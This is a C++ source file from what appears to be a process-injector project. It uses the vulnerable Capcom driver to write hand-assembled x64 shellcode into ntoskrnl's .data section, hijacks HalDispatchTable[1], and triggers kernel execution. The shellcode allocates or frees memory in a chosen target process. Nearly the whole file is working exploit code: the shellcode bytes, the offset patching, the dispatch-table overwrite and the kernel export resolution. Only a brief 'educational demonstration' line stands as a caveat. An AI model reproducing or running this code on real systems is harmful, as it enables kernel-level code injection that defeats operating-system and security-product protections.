// src/Injector/KernelExec.cpp
// Kernel shellcode execution primitive using HalDispatchTable hijack.
// Requires CapcomDriver for kernel R/W access (PID 4 / System process).
//
// Technique:
//   1. Locate ntoskrnl base and HalDispatchTable via PE export walking
//   2. Save original HalDispatchTable[1] pointer
//   3. Write shellcode + parameter block into a zero-filled region of
//      ntoskrnl's .data section (kernel-writable, found at init time)
//   4. Overwrite HalDispatchTable[1] with the shellcode address
//   5. Trigger execution via NtQuerySystemInformation(0,...)
//   6. Shellcode runs in kernel context, calls ZwAllocateVirtualMemory or
//      ZwFreeVirtualMemory, stores results in the parameter block
//   7. Restore HalDispatchTable[1] to its original value
//
// FOR EDUCATIONAL DEMONSTRATION ONLY.
// PatchGuard may detect HalDispatchTable modification on retail builds.

#include "KernelExec.h"
#include "CapcomDriver.h"

#include <winternl.h>
#include <cstring>
#include <stdexcept>
#include <vector>

// Undocumented NT API — triggers HalDispatchTable dispatch.
extern "C" NTSTATUS NTAPI NtQuerySystemInformation(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);

// Kernel function type aliases used by the shellcode.
using ZwAllocateVirtualMemory_t = NTSTATUS(NTAPI*)(
    HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits,
    PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);

using ZwFreeVirtualMemory_t = NTSTATUS(NTAPI*)(
    HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize, ULONG FreeType);

// ---------------------------------------------------------------------------
// ShellcodeParams — contiguous block placed in kernel memory before the
// shellcode bytes.  The shellcode uses absolute addressing to read its
// arguments and write its results.
//
// Cross-process allocation is achieved via KeStackAttachProcess:
//   1. PsLookupProcessByProcessId(targetPid, &eprocess)
//   2. KeStackAttachProcess(eprocess, &apcState)
//   3. ZwAllocateVirtualMemory(-1, ...)  — now allocates in target
//   4. KeUnstackDetachProcess(&apcState)
//   5. ObDereferenceObject(eprocess)
// ---------------------------------------------------------------------------
#pragma pack(push, 1)
struct ShellcodeParams {
    // ---- Kernel function pointers (resolved at init/runtime) ----
    uint64_t fnZwAllocateVirtualMemory;     // +0x00
    uint64_t fnZwFreeVirtualMemory;         // +0x08
    uint64_t fnPsLookupProcessByProcessId;  // +0x10
    uint64_t fnKeStackAttachProcess;        // +0x18
    uint64_t fnKeUnstackDetachProcess;      // +0x20
    uint64_t fnObDereferenceObject;         // +0x28

    // ---- Input parameters ----
    uint64_t targetPid;                     // +0x30: target process ID
    uint64_t outBaseAddress;                // +0x38: [out] allocated/freed base address
    uint64_t allocationSize;                // +0x40: size (in/out pointer target)
    uint64_t protect;                       // +0x48: page protection for alloc

    // ---- Output ----
    uint64_t ntStatus;                      // +0x50: [out] NTSTATUS from kernel call
    uint64_t returnAddress;                 // +0x58: reserved (unused — return via ret)

    // ---- Intermediate storage (written by shellcode) ----
    uint64_t eprocess;                      // +0x60: [out] EPROCESS from PsLookup
    uint8_t  apcState[0x30];               // +0x68: KAPC_STATE storage (x64 = 0x30 bytes)
};
#pragma pack(pop)

// =========================================================================
//  x64 Shellcode — Allocate Virtual Memory (cross-process via KeStackAttachProcess)
// =========================================================================
//
// Register convention on entry (from HalDispatchTable dispatch):
//   RCX = SystemInformationClass (0)
//   RDX = SystemInformation buffer
//   R8  = buffer length
//   R9  = ReturnLength pointer
// All values are ignored; the shellcode reads its own parameter block.
//
// Logic:
//   1. PsLookupProcessByProcessId(targetPid, &eprocess)
//   2. KeStackAttachProcess(eprocess, &apcState)
//   3. ZwAllocateVirtualMemory(-1, &outBase, 0, &size, MEM_COMMIT|MEM_RESERVE, protect)
//   4. KeUnstackDetachProcess(&apcState)
//   5. ObDereferenceObject(eprocess)
//
// Prologue allocates 0x38 bytes (shadow 0x20 + 2 stack-arg slots 0x10 + 8 align).
// paramsBase is stored at [rsp+0x30] and reloaded via that slot after each call
// (r10 is volatile per x64 ABI), so only TWO patches are needed:
//   - offset 0x06: 8-byte paramsBase (inside mov r10, imm64)
//   - offset 0x23: 4-byte jnz disp32 (disp32 = target - end_of_instruction)
//
// Total shellcode size: 0x92 (146 bytes).

static constexpr uint8_t kAllocShellcode[] = {
    // ---- Prologue: save paramsBase on stack ----
    0x48, 0x83, 0xEC, 0x38,                         // 00: sub rsp, 0x38
    0x49, 0xBA, 0x00, 0x00, 0x00, 0x00,             // 04: mov r10, <paramsBase>
    0x00, 0x00, 0x00, 0x00,                         //     (8-byte imm at offset 6)
    0x4C, 0x89, 0x54, 0x24, 0x30,                   // 0E: mov [rsp+0x30], r10

    // ---- Step 1: PsLookupProcessByProcessId(targetPid, &eprocess) ----
    0x49, 0x8B, 0x4A, 0x30,                         // 13: mov rcx, [r10+0x30]   ; targetPid
    0x49, 0x8D, 0x52, 0x60,                         // 17: lea rdx, [r10+0x60]   ; &eprocess
    0x41, 0xFF, 0x52, 0x10,                         // 1B: call [r10+0x10]       ; PsLookupProcessByProcessId
    0x85, 0xC0,                                     // 1F: test eax, eax
    0x0F, 0x85, 0x00, 0x00, 0x00, 0x00,             // 21: jnz alloc_error        ; (4-byte disp32 at offset 22)

    // ---- Step 2: KeStackAttachProcess(eprocess, &apcState) ----
    0x4C, 0x8B, 0x54, 0x24, 0x30,                   // 27: mov r10, [rsp+0x30]   ; reload
    0x49, 0x8B, 0x4A, 0x60,                         // 2C: mov rcx, [r10+0x60]   ; eprocess
    0x49, 0x8D, 0x52, 0x68,                         // 30: lea rdx, [r10+0x68]   ; &apcState
    0x41, 0xFF, 0x52, 0x18,                         // 34: call [r10+0x18]       ; KeStackAttachProcess

    // ---- Step 3: ZwAllocateVirtualMemory(-1, &outBase, 0, &size, 0x3000, protect) ----
    0x4C, 0x8B, 0x54, 0x24, 0x30,                   // 38: mov r10, [rsp+0x30]   ; reload
    0x48, 0x83, 0xC9, 0xFF,                         // 3D: or  rcx, -1            ; pseudo-handle (target after attach)
    0x49, 0x8D, 0x52, 0x38,                         // 41: lea rdx, [r10+0x38]   ; &outBaseAddress
    0x45, 0x31, 0xC0,                               // 45: xor r8d, r8d           ; ZeroBits = 0
    0x4D, 0x8D, 0x4A, 0x40,                         // 48: lea r9,  [r10+0x40]   ; &allocationSize
    0x48, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x30,       // 4C: mov qword [rsp+0x20], 0x3000  ; MEM_COMMIT|MEM_RESERVE (5th arg)
    0x00, 0x00,
    0x49, 0x8B, 0x42, 0x48,                         // 55: mov rax, [r10+0x48]   ; protect
    0x48, 0x89, 0x44, 0x24, 0x28,                   // 59: mov [rsp+0x28], rax   ; protect (6th arg)
    0x41, 0xFF, 0x12,                               // 5E: call [r10]             ; ZwAllocateVirtualMemory

    // ---- Save NTSTATUS ----
    0x4C, 0x8B, 0x54, 0x24, 0x30,                   // 61: mov r10, [rsp+0x30]
    0x49, 0x89, 0x42, 0x50,                         // 66: mov [r10+0x50], rax   ; save ntStatus

    // ---- Step 4: KeUnstackDetachProcess(&apcState) ----
    0x49, 0x8D, 0x4A, 0x68,                         // 6A: lea rcx, [r10+0x68]
    0x41, 0xFF, 0x52, 0x20,                         // 6E: call [r10+0x20]       ; KeUnstackDetachProcess

    // ---- Step 5: ObDereferenceObject(eprocess) ----
    0x4C, 0x8B, 0x54, 0x24, 0x30,                   // 72: mov r10, [rsp+0x30]
    0x49, 0x8B, 0x4A, 0x60,                         // 77: mov rcx, [r10+0x60]
    0x41, 0xFF, 0x52, 0x28,                         // 7B: call [r10+0x28]       ; ObDereferenceObject

    // ---- Epilogue ----
    0x48, 0x83, 0xC4, 0x38,                         // 7F: add rsp, 0x38
    0xC3,                                           // 83: ret

    // ---- alloc_error: store error status and return ----
    0x4C, 0x8B, 0x54, 0x24, 0x30,                   // 84: mov r10, [rsp+0x30]
    0x49, 0x89, 0x42, 0x50,                         // 89: mov [r10+0x50], rax
    0x48, 0x83, 0xC4, 0x38,                         // 8D: add rsp, 0x38
    0xC3                                            // 91: ret
};
static constexpr size_t kAllocShellcodeSize = sizeof(kAllocShellcode);
static_assert(kAllocShellcodeSize == 0x92, "Alloc shellcode size mismatch");
static constexpr size_t kAllocPatchParamsBase = 6;   // paramsBase imm64 (49 BA ...)
static constexpr size_t kAllocPatchJnz       = 0x23; // jnz disp32 (0F 85 xx xx xx xx)

// =========================================================================
//  x64 Shellcode — Free Virtual Memory (cross-process via KeStackAttachProcess)
// =========================================================================
//
// Same KeStackAttachProcess / KeUnstackDetachProcess sequence as the alloc
// shellcode.  ZwFreeVirtualMemory takes only 4 register args so the stack
// frame is the standard 0x28-byte shadow space.
//
// Total shellcode size: 0x85 (133 bytes).

static constexpr uint8_t kFreeShellcode[] = {
    // ---- Prologue: save paramsBase on stack ----
    0x48, 0x83, 0xEC, 0x28,                         // 00: sub rsp, 0x28
    0x49, 0xBA, 0x00, 0x00, 0x00, 0x00,             // 04: mov r10, <paramsBase>
    0x00, 0x00, 0x00, 0x00,                         //     (8-byte imm at offset 6)
    0x4C, 0x89, 0x54, 0x24, 0x20,                   // 0E: mov [rsp+0x20], r10

    // ---- Step 1: PsLookupProcessByProcessId(targetPid, &eprocess) ----
    0x49, 0x8B, 0x4A, 0x30,                         // 13: mov rcx, [r10+0x30]
    0x49, 0x8D, 0x52, 0x60,                         // 17: lea rdx, [r10+0x60]
    0x41, 0xFF, 0x52, 0x10,                         // 1B: call [r10+0x10]       ; PsLookupProcessByProcessId
    0x85, 0xC0,                                     // 1F: test eax, eax
    0x0F, 0x85, 0x00, 0x00, 0x00, 0x00,             // 21: jnz free_error         ; (4-byte disp32 at offset 22)

    // ---- Step 2: KeStackAttachProcess(eprocess, &apcState) ----
    0x4C, 0x8B, 0x54, 0x24, 0x20,                   // 27: mov r10, [rsp+0x20]
    0x49, 0x8B, 0x4A, 0x60,                         // 2C: mov rcx, [r10+0x60]
    0x49, 0x8D, 0x52, 0x68,                         // 30: lea rdx, [r10+0x68]
    0x41, 0xFF, 0x52, 0x18,                         // 34: call [r10+0x18]       ; KeStackAttachProcess

    // ---- Step 3: ZwFreeVirtualMemory(-1, &outBase, &size, MEM_RELEASE) ----
    0x4C, 0x8B, 0x54, 0x24, 0x20,                   // 38: mov r10, [rsp+0x20]
    0x48, 0x83, 0xC9, 0xFF,                         // 3D: or  rcx, -1
    0x49, 0x8D, 0x52, 0x38,                         // 41: lea rdx, [r10+0x38]   ; &outBaseAddress
    0x4D, 0x8D, 0x42, 0x40,                         // 45: lea r8,  [r10+0x40]   ; &allocationSize
    0x49, 0xC7, 0xC1, 0x00, 0x80, 0x00, 0x00,       // 49: mov r9,  0x8000        ; MEM_RELEASE
    0x41, 0xFF, 0x52, 0x08,                         // 50: call [r10+0x08]       ; ZwFreeVirtualMemory

    // ---- Save NTSTATUS ----
    0x4C, 0x8B, 0x54, 0x24, 0x20,                   // 54: mov r10, [rsp+0x20]
    0x49, 0x89, 0x42, 0x50,                         // 59: mov [r10+0x50], rax

    // ---- Step 4: KeUnstackDetachProcess(&apcState) ----
    0x49, 0x8D, 0x4A, 0x68,                         // 5D: lea rcx, [r10+0x68]
    0x41, 0xFF, 0x52, 0x20,                         // 61: call [r10+0x20]       ; KeUnstackDetachProcess

    // ---- Step 5: ObDereferenceObject(eprocess) ----
    0x4C, 0x8B, 0x54, 0x24, 0x20,                   // 65: mov r10, [rsp+0x20]
    0x49, 0x8B, 0x4A, 0x60,                         // 6A: mov rcx, [r10+0x60]
    0x41, 0xFF, 0x52, 0x28,                         // 6E: call [r10+0x28]       ; ObDereferenceObject

    // ---- Epilogue ----
    0x48, 0x83, 0xC4, 0x28,                         // 72: add rsp, 0x28
    0xC3,                                           // 76: ret

    // ---- free_error: store error status and return ----
    0x4C, 0x8B, 0x54, 0x24, 0x20,                   // 77: mov r10, [rsp+0x20]
    0x49, 0x89, 0x42, 0x50,                         // 7C: mov [r10+0x50], rax
    0x48, 0x83, 0xC4, 0x28,                         // 80: add rsp, 0x28
    0xC3                                            // 84: ret
};
static constexpr size_t kFreeShellcodeSize = sizeof(kFreeShellcode);
static_assert(kFreeShellcodeSize == 0x85, "Free shellcode size mismatch");
static constexpr size_t kFreePatchParamsBase = 6;   // paramsBase imm64 (49 BA ...)
static constexpr size_t kFreePatchJnz       = 0x23; // jnz disp32 (0F 85 xx xx xx xx)

// =========================================================================
//  Singleton
// =========================================================================

KernelExec& KernelExec::GetInstance() {
    static KernelExec instance;
    return instance;
}

// =========================================================================
//  Initialize — one-time setup of kernel addresses and shellcode buffer
// =========================================================================

bool KernelExec::Initialize() {
    if (m_initialized) return true;

    auto& capcom = CapcomDriver::GetInstance();
    if (!capcom.IsLoaded()) return false;

    // ---- Step 1: Locate ntoskrnl base via NtQuerySystemInformation ----
    ULONG bufSize = 0;
    NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)11, nullptr, 0, &bufSize);
    // SystemModuleInformation = 11

    std::vector<uint8_t> buf(bufSize);
    auto* modInfo = reinterpret_cast<PRTL_PROCESS_MODULES>(buf.data());
    NTSTATUS status = NtQuerySystemInformation(
        (SYSTEM_INFORMATION_CLASS)11, buf.data(), bufSize, &bufSize);

    if (status < 0) return false;

    // First module in the list is always ntoskrnl.exe
    m_kernelBase = reinterpret_cast<uintptr_t>(modInfo->Modules[0].ImageBase);
    if (!m_kernelBase) return false;

    // ---- Step 2: Locate HalDispatchTable ----
    if (!LocateHalDispatchTable()) return false;

    // ---- Step 3: Read original HalDispatchTable[1] ----
    // HalDispatchTable is an array of function pointers; index 1 = HalQuerySystemInformation
    uintptr_t halQuerySlot = m_halDispatch + sizeof(uintptr_t); // index 1
    m_originalPtr = capcom.Read<uintptr_t>(4, halQuerySlot);
    if (!m_originalPtr) return false;

    // ---- Step 4: Find a writable zero-filled region in ntoskrnl's .data ----
    // We read the PE section table through the Capcom driver (PID 4 reads kernel VA).
    IMAGE_DOS_HEADER dosHeader = capcom.Read<IMAGE_DOS_HEADER>(4, m_kernelBase);
    if (dosHeader.e_magic != IMAGE_DOS_SIGNATURE) return false;

    IMAGE_NT_HEADERS64 ntHeaders = capcom.Read<IMAGE_NT_HEADERS64>(
        4, m_kernelBase + dosHeader.e_lfanew);
    if (ntHeaders.Signature != IMAGE_NT_SIGNATURE) return false;

    uintptr_t sectionTable = m_kernelBase + dosHeader.e_lfanew
                           + sizeof(IMAGE_NT_HEADERS64);
    uintptr_t dataSectionBase = 0;
    size_t    dataSectionSize = 0;

    for (int i = 0; i < ntHeaders.FileHeader.NumberOfSections; ++i) {
        IMAGE_SECTION_HEADER section = capcom.Read<IMAGE_SECTION_HEADER>(
            4, sectionTable + i * sizeof(IMAGE_SECTION_HEADER));
        // Only target ".data" — PAGE sections are pageable code (RX), not writable data.
        if (memcmp(section.Name, ".data", 5) == 0) {
            dataSectionBase = m_kernelBase + section.VirtualAddress;
            dataSectionSize = section.Misc.VirtualSize;
            break;
        }
    }

    if (!dataSectionBase || dataSectionSize < 0x1000) return false;

    // Scan for a 512-byte aligned block of zeros inside the writable section.
    // The combined params + max(shellcode) is ~0x12A bytes; a 0x200 (512-byte)
    // zero-filled block provides sufficient headroom.
    m_shellcodeAddr = 0;
    for (uintptr_t scan = dataSectionBase;
         scan < dataSectionBase + dataSectionSize - 0x200;
         scan += 0x100) {
        std::vector<uint8_t> chunk(0x200);
        if (capcom.ReadMemory(4, scan, chunk.data(), 0x200)) {
            bool allZero = true;
            for (size_t j = 0; j < 0x200; ++j) {
                if (chunk[j] != 0x00) { allZero = false; break; }
            }
            if (allZero) {
                m_shellcodeAddr = scan;
                break;
            }
        }
    }

    if (!m_shellcodeAddr) return false;

    m_initialized = true;
    return true;
}

// =========================================================================
//  Shutdown
// =========================================================================

void KernelExec::Shutdown() {
    m_initialized    = false;
    m_kernelBase     = 0;
    m_halDispatch    = 0;
    m_originalPtr    = 0;
    m_shellcodeAddr  = 0;
}

// =========================================================================
//  AllocateRemoteMemory — allocate virtual memory in a TARGET process using
//  kernel shellcode.  The shellcode uses KeStackAttachProcess to switch the
//  current thread's address space to the target before calling
//  ZwAllocateVirtualMemory.  This guarantees the allocation lands in the
//  target process, not the injector.
// =========================================================================

uint64_t KernelExec::AllocateRemoteMemory(DWORD targetPid, uintptr_t& outBase,
                                           size_t size, DWORD protect,
                                           HANDLE* outHandle) {
    auto& capcom = CapcomDriver::GetInstance();
    if (!m_initialized || !capcom.IsLoaded())
        return 0xC0000001; // STATUS_UNSUCCESSFUL

    // ---- Resolve all six kernel functions ----
    uint64_t fnZwAlloc   = FindKernelExport("ZwAllocateVirtualMemory");
    uint64_t fnZwFree    = FindKernelExport("ZwFreeVirtualMemory");
    uint64_t fnPsLookup  = FindKernelExport("PsLookupProcessByProcessId");
    uint64_t fnKeAttach  = FindKernelExport("KeStackAttachProcess");
    uint64_t fnKeDetach  = FindKernelExport("KeUnstackDetachProcess");
    uint64_t fnObDeref   = FindKernelExport("ObDereferenceObject");

    if (!fnZwAlloc || !fnPsLookup || !fnKeAttach || !fnKeDetach || !fnObDeref)
        return 0xC0000001;

    // ---- Build the parameter block ----
    ShellcodeParams params{};
    params.fnZwAllocateVirtualMemory    = fnZwAlloc;
    params.fnZwFreeVirtualMemory        = fnZwFree;   // unused by alloc
    params.fnPsLookupProcessByProcessId = fnPsLookup;
    params.fnKeStackAttachProcess       = fnKeAttach;
    params.fnKeUnstackDetachProcess     = fnKeDetach;
    params.fnObDereferenceObject        = fnObDeref;
    params.targetPid                    = static_cast<uint64_t>(targetPid);
    params.outBaseAddress               = 0;
    params.allocationSize               = size;
    params.protect                      = protect;
    params.ntStatus                     = 0;
    params.returnAddress                = 0;
    params.eprocess                     = 0;
    std::memset(params.apcState, 0, sizeof(params.apcState));

    // ---- Prepare shellcode buffer: [params] [shellcode] ----
    std::vector<uint8_t> kernelBuf(sizeof(ShellcodeParams) + kAllocShellcodeSize);
    std::memcpy(kernelBuf.data(), &params, sizeof(params));

    // Copy the alloc shellcode template and patch in the params base address.
    uint8_t patchedShellcode[kAllocShellcodeSize];
    std::memcpy(patchedShellcode, kAllocShellcode, kAllocShellcodeSize);

    // Patch 1: paramsBase at offset kAllocPatchParamsBase (6)
    std::memcpy(patchedShellcode + kAllocPatchParamsBase,
                &m_shellcodeAddr, sizeof(m_shellcodeAddr));

    // Patch 2: jnz disp32 at offset kAllocPatchJnz (0x23)
    // alloc_error label is at offset 0x84, jnz instruction ends at 0x23+4=0x27
    // disp32 = 0x84 - 0x27 = 0x5D
    constexpr uint32_t kAllocJnzDisp = 0x84 - (kAllocPatchJnz + 4);
    std::memcpy(patchedShellcode + kAllocPatchJnz,
                &kAllocJnzDisp, sizeof(kAllocJnzDisp));

    std::memcpy(kernelBuf.data() + sizeof(params), patchedShellcode, kAllocShellcodeSize);

    // ---- Write parameter block + shellcode into kernel memory ----
    if (!capcom.WriteMemory(4, m_shellcodeAddr, kernelBuf.data(), kernelBuf.size()))
        return 0xC0000001;

    // ---- Hijack HalDispatchTable[1] -> shellcode ----
    uintptr_t shellcodeBase = m_shellcodeAddr + sizeof(ShellcodeParams);
    uintptr_t halQuerySlot  = m_halDispatch + sizeof(uintptr_t);
    capcom.Write<uintptr_t>(4, halQuerySlot, shellcodeBase);

    // ---- Trigger execution via NtQuerySystemInformation ----
    ULONG dummy = 0;
    NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)0, &dummy, 0, &dummy);

    // ---- Restore HalDispatchTable[1] ----
    capcom.Write<uintptr_t>(4, halQuerySlot, m_originalPtr);

    // ---- Read back results ----
    ShellcodeParams resultParams = capcom.Read<ShellcodeParams>(4, m_shellcodeAddr);
    outBase = resultParams.outBaseAddress;
    if (outHandle)
        *outHandle = nullptr; // no user-mode handle is created by kernel alloc

    return resultParams.ntStatus;
}

// =========================================================================
//  FreeRemoteMemory — free virtual memory in a target process via kernel
//  shellcode that uses KeStackAttachProcess to operate in the target's
//  address space, then calls ZwFreeVirtualMemory with MEM_RELEASE.
// =========================================================================

uint64_t KernelExec::FreeRemoteMemory(DWORD targetPid, uintptr_t base, size_t size) {
    auto& capcom = CapcomDriver::GetInstance();
    if (!m_initialized || !capcom.IsLoaded())
        return 0xC0000001; // STATUS_UNSUCCESSFUL

    // ---- Resolve all six kernel functions ----
    uint64_t fnZwAlloc   = FindKernelExport("ZwAllocateVirtualMemory");
    uint64_t fnZwFree    = FindKernelExport("ZwFreeVirtualMemory");
    uint64_t fnPsLookup  = FindKernelExport("PsLookupProcessByProcessId");
    uint64_t fnKeAttach  = FindKernelExport("KeStackAttachProcess");
    uint64_t fnKeDetach  = FindKernelExport("KeUnstackDetachProcess");
    uint64_t fnObDeref   = FindKernelExport("ObDereferenceObject");

    if (!fnZwFree || !fnPsLookup || !fnKeAttach || !fnKeDetach || !fnObDeref)
        return 0xC0000001;

    // ---- Build the parameter block ----
    ShellcodeParams params{};
    params.fnZwAllocateVirtualMemory    = fnZwAlloc;  // unused by free
    params.fnZwFreeVirtualMemory        = fnZwFree;
    params.fnPsLookupProcessByProcessId = fnPsLookup;
    params.fnKeStackAttachProcess       = fnKeAttach;
    params.fnKeUnstackDetachProcess     = fnKeDetach;
    params.fnObDereferenceObject        = fnObDeref;
    params.targetPid                    = static_cast<uint64_t>(targetPid);
    params.outBaseAddress               = base;
    params.allocationSize               = size;  // 0 for MEM_RELEASE semantics
    params.protect                      = 0;
    params.ntStatus                     = 0;
    params.returnAddress                = 0;
    params.eprocess                     = 0;
    std::memset(params.apcState, 0, sizeof(params.apcState));

    // ---- Prepare shellcode buffer: [params] [shellcode] ----
    std::vector<uint8_t> kernelBuf(sizeof(ShellcodeParams) + kFreeShellcodeSize);
    std::memcpy(kernelBuf.data(), &params, sizeof(params));

    // Copy the free shellcode template and patch in the params base address.
    uint8_t patchedShellcode[kFreeShellcodeSize];
    std::memcpy(patchedShellcode, kFreeShellcode, kFreeShellcodeSize);

    // Patch 1: paramsBase at offset kFreePatchParamsBase (6)
    std::memcpy(patchedShellcode + kFreePatchParamsBase,
                &m_shellcodeAddr, sizeof(m_shellcodeAddr));

    // Patch 2: jnz disp32 at offset kFreePatchJnz (0x23)
    // free_error label is at offset 0x77, jnz instruction ends at 0x23+4=0x27
    // disp32 = 0x77 - 0x27 = 0x50
    constexpr uint32_t kFreeJnzDisp = 0x77 - (kFreePatchJnz + 4);
    std::memcpy(patchedShellcode + kFreePatchJnz,
                &kFreeJnzDisp, sizeof(kFreeJnzDisp));

    std::memcpy(kernelBuf.data() + sizeof(params), patchedShellcode, kFreeShellcodeSize);

    // ---- Write to kernel memory ----
    if (!capcom.WriteMemory(4, m_shellcodeAddr, kernelBuf.data(), kernelBuf.size()))
        return 0xC0000001;

    // ---- Hijack HalDispatchTable[1] ----
    uintptr_t shellcodeBase = m_shellcodeAddr + sizeof(ShellcodeParams);
    uintptr_t halQuerySlot  = m_halDispatch + sizeof(uintptr_t);
    capcom.Write<uintptr_t>(4, halQuerySlot, shellcodeBase);

    // ---- Trigger execution ----
    ULONG dummy = 0;
    NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)0, &dummy, 0, &dummy);

    // ---- Restore HalDispatchTable[1] ----
    capcom.Write<uintptr_t>(4, halQuerySlot, m_originalPtr);

    // ---- Read back result ----
    ShellcodeParams resultParams = capcom.Read<ShellcodeParams>(4, m_shellcodeAddr);
    return resultParams.ntStatus;
}

// =========================================================================
//  LocateHalDispatchTable — find the HalDispatchTable address in ntoskrnl.
//
//  Strategy:
//    1. Try to resolve "HalDispatchTable" as a named export (works on many
//       Windows 10+ builds).
//    2. Fall back: disassemble the start of HalQuerySystemInformation,
//       scanning for `lea rcx, [rip + disp32]` which references the table.
// =========================================================================

bool KernelExec::LocateHalDispatchTable() {
    auto& capcom = CapcomDriver::GetInstance();

    // Primary path: named export
    uintptr_t halDispatch = FindKernelExport("HalDispatchTable");
    if (halDispatch) {
        m_halDispatch = halDispatch;
        return true;
    }

    // Fallback: find HalQuerySystemInformation and scan its prologue
    uintptr_t halQuery = FindKernelExport("HalQuerySystemInformation");
    if (!halQuery) return false;

    // Read 512 bytes of the function body
    std::vector<uint8_t> code(0x200);
    if (!capcom.ReadMemory(4, halQuery, code.data(), code.size()))
        return false;

    // Scan for:  lea rcx, [rip + disp32]
    // Encoding:  48 8D 0D xx xx xx xx
    for (size_t i = 0; i < code.size() - 7; ++i) {
        if (code[i] == 0x48 && code[i+1] == 0x8D && code[i+2] == 0x0D) {
            int32_t disp = *reinterpret_cast<int32_t*>(code.data() + i + 3);
            m_halDispatch = halQuery + i + 7 + static_cast<int64_t>(disp);
            return true;
        }
    }

    return false;
}

// =========================================================================
//  FindKernelExport — resolve an exported symbol address within ntoskrnl
//  by walking the PE export directory via Capcom kernel reads.
// =========================================================================

uintptr_t KernelExec::FindKernelExport(const std::string& funcName) {
    auto& capcom = CapcomDriver::GetInstance();
    if (!m_kernelBase) return 0;

    // Read DOS header
    IMAGE_DOS_HEADER dos = capcom.Read<IMAGE_DOS_HEADER>(4, m_kernelBase);
    if (dos.e_magic != IMAGE_DOS_SIGNATURE) return 0;

    // Read NT headers
    IMAGE_NT_HEADERS64 nt = capcom.Read<IMAGE_NT_HEADERS64>(
        4, m_kernelBase + dos.e_lfanew);
    if (nt.Signature != IMAGE_NT_SIGNATURE) return 0;

    // Locate export directory
    auto& exportDir = nt.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!exportDir.VirtualAddress || !exportDir.Size) return 0;

    IMAGE_EXPORT_DIRECTORY exports = capcom.Read<IMAGE_EXPORT_DIRECTORY>(
        4, m_kernelBase + exportDir.VirtualAddress);

    uintptr_t namesBase = m_kernelBase + exports.AddressOfNames;
    uintptr_t ordsBase  = m_kernelBase + exports.AddressOfNameOrdinals;
    uintptr_t funcsBase = m_kernelBase + exports.AddressOfFunctions;

    for (DWORD i = 0; i < exports.NumberOfNames; ++i) {
        DWORD nameRva = capcom.Read<DWORD>(4, namesBase + i * sizeof(DWORD));
        char nameBuf[256] = {};
        capcom.ReadMemory(4, m_kernelBase + nameRva, nameBuf, sizeof(nameBuf) - 1);

        if (funcName == nameBuf) {
            WORD ordinal   = capcom.Read<WORD>(4, ordsBase + i * sizeof(WORD));
            DWORD funcRva  = capcom.Read<DWORD>(4, funcsBase + ordinal * sizeof(DWORD));
            return m_kernelBase + funcRva;
        }
    }

    return 0;
}
